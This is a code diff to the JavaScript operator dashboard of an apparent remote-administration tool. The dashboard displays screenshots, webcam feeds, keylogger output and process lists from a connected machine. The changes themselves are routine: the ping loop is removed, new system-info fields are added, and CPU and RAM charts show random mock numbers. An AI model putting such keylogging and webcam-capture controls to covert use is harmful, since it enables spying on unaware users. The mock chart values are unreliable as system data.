@@ -2,11 +2,10 @@
 let websocket = null;
 let intervalUptime = null;
 let intervalSensors = null;
-let intervalPing = null; 
+// Removed intervalPing
 let systemStartTime = 0; 
 let lastScreenshotUrl = null; 
 let lastWebcamUrl = null;
-let pingStartTime = 0;
 
 // Webcam State
 let isRecording = false;
@@ -150,13 +149,17 @@ function sendCmd(command) {
 function resetDashboardState() {
     document.getElementById("sys-hostname").innerText = "---";
     document.getElementById("sys-os").innerText = "---";
-    document.getElementById("status-res").innerText = "---";
+    
+    // [RESET ID MOI]
+    document.getElementById("status-ram").innerText = "---";
     document.getElementById("status-batt").innerText = "---";
+    document.getElementById("status-disk").innerText = "---";
+    document.getElementById("status-procs").innerText = "---";
+
     document.getElementById("sys-uptime").innerText = "--:--:--";
     document.getElementById("sys-network").innerText = "Disconnected";
     document.getElementById("sys-network").style.color = "#fb7185";
-    document.getElementById("sensor-temp").innerText = "--°C";
-    document.getElementById("sensor-ping").innerText = "-- ms";
+    
     const chartCpu = document.getElementById("chart-cpu");
     if(chartCpu) { chartCpu.style.setProperty('--p', 0); chartCpu.querySelector('span').innerText = "0%"; }
     const chartRam = document.getElementById("chart-ram");
@@ -174,48 +177,42 @@ function startDashboardUpdates() {
         document.getElementById("sys-uptime").innerText = `${h}:${m}:${s}`;
     }, 1000);
 
-    if(intervalPing) clearInterval(intervalPing);
-    intervalPing = setInterval(() => { pingStartTime = Date.now(); sendCmd("ping"); }, 2000);
-
+    // [UPDATED] Chi con 1 Loop duy nhat de cap nhat Info moi 3s (vi rat nhe)
     if(intervalSensors) clearInterval(intervalSensors);
     intervalSensors = setInterval(() => {
         sendCmd("get-sys-info"); 
+        // Mock data cho bieu do
         const cpu = Math.floor(Math.random() * 30) + 10;
         const chartCpu = document.getElementById("chart-cpu");
         if(chartCpu) { chartCpu.style.setProperty('--p', cpu); chartCpu.querySelector('span').innerText = cpu + "%"; }
         const ram = Math.floor(Math.random() * 20) + 40;
         const chartRam = document.getElementById("chart-ram");
         if(chartRam) { chartRam.style.setProperty('--p', ram); chartRam.querySelector('span').innerText = ram + "%"; }
-    }, 5000); 
+    }, 3000); 
 }
 
 function stopDashboardUpdates() {
     if(intervalUptime) clearInterval(intervalUptime);
-    if(intervalPing) clearInterval(intervalPing);
     if(intervalSensors) clearInterval(intervalSensors);
     resetDashboardState();
 }
 
 /* --- MESSAGE HANDLER --- */
 function handleIncomingMessage(data) {
-    if (data.trim() === "pong") {
-        const latency = Date.now() - pingStartTime;
-        const elPing = document.getElementById("sensor-ping");
-        if(elPing) elPing.innerText = latency + " ms";
-        return; 
-    }
     if (data.startsWith("sys-info ")) {
+        // [UPDATED] Format: sys-info Host|OS|RAMFree|Battery|DiskFree|ProcessCount
         const parts = data.substring(9).split("|");
+        
         if (parts.length >= 2) {
             document.getElementById("sys-hostname").innerText = parts[0];
             document.getElementById("sys-os").innerText = parts[1];
         }
-        if (parts.length >= 4) {
-            document.getElementById("status-res").innerText = parts[2];
+        if (parts.length >= 6) {
+            // Cap nhat 4 o Live Status
+            document.getElementById("status-ram").innerText = parts[2];
             document.getElementById("status-batt").innerText = parts[3];
-        }
-        if (parts.length >= 5) {
-            document.getElementById("sensor-temp").innerText = parts[4];
+            document.getElementById("status-disk").innerText = parts[4];
+            document.getElementById("status-procs").innerText = parts[5];
         }
     }
     else if (data.startsWith("file ")) {
@@ -225,7 +222,6 @@ function handleIncomingMessage(data) {
         updateSystemStatus("webcam", false);
     } 
     else if (data.startsWith("screenshot ")) { handleScreenshotData(data); }
-    // --- KEYLOG DATA ---
     else if (data.startsWith("KEYLOG_DATA:")) {
         const content = data.substring(12);
         const box = document.getElementById("keylog-output");
@@ -239,7 +235,6 @@ function handleIncomingMessage(data) {
         addActivityLog("Fetched keylogs");
         showToast("Keylogs Fetched");
     }
-    // --- APP & PROCESS RESPONSE ---
     else if (data.startsWith("DANH SACH UNG DUNG")) { 
         renderAppList(data); 
         addActivityLog("App list updated"); 
@@ -264,7 +259,6 @@ function handleIncomingMessage(data) {
         if(data.includes("Error") || data.includes("Loi") || data.includes("failed")) {
              showToast(data, "error");
         }
-        // Success message for Kill
         if(data.includes("Success:") || data.includes("Da diet")) {
              showToast(data.replace("Server: ", ""), "success");
         }
